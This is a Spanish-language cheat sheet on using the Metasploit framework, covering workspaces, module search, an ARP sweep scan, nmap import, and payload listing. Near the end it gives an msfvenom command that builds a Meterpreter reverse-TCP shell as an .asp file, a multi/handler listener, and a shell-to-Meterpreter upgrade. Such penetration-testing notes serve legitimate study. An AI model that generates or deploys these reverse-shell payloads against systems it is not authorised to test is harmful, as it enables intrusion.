#tool 
# ¿Qué es?

**Metasploit** es una plataforma de pruebas de penetración (Penetration Testing Framework) que se utiliza para realizar pruebas de seguridad en sistemas y aplicaciones.

# Uso

La primera vez ejecuta:

```bash
service postgresql start

msfdb run
```

El resto:

```bash
service postgresql start && msfconsole
```

## Workspaces

Con `workspace` podemos ver el área de trabajo actual. Con `workspace -h` todas las opciones.

Para añadir uno nuevo, podemos usar:
```bash
workspace -a <nombre>
```

Para cambiar de uno a otro:
```bash
workspace <nombre>
```

## Módulos

### Búsqueda

Para buscar podemos utilizar `search`:

```msf
search arp
```

### Usar un módulo

Para usar un módulo concreto utilizamos `use`:

```bash
use <ruta>
```

Dentro del módulo, con **`info`** podemos listar las opciones:

```bash
       Name: ARP Sweep Local Network Discovery
     Module: auxiliary/scanner/discovery/arp_sweep
    License: Metasploit Framework License (BSD)
       Rank: Normal

Provided by:
  belch

Check supported:
  No

Basic options:
  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  INTERFACE                   no        The name of the interface
  RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
  SHOST                       no        Source IP Address
  SMAC                        no        Source MAC Address
  THREADS    1                yes       The number of concurrent threads (max one per host)
  TIMEOUT    5                yes       The number of seconds to wait for new data

Description:
  Enumerate alive Hosts in local network using ARP requests.
```
> Ejemplo de *output* del comando.

Para asignar un valor a una opción utilizamos **`set`**, y lo corremos con **`run`**:

```bash
set RHOSTS 192.168.0.0/24
```
```bash
run
```

### Importar información

Podemos importar información en formato [[XML]], por ejemplo capturas de [[nmap]]:

```bash
db_import <ruta>
```

## nmap

Metasploit tiene integrado un [[nmap]]:

```bash
db_nmap
```

## Payloads

Podemos listar payloads:

```bash
show payloads
```

O con [[msfvenom]]:

```bash
msfvenom -l payloads
```

### Crear payload con msfvenom

Por ejemplo para crear un `.asp`:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
```

## Listener

```bash
use multi/handler
set LHOST=<ip>
set LPORT=<port>
run
```

## Meterpreter

Upgradear shell a meterpreter:
```bash
search shell_to_meterpreter

session -u 1
```
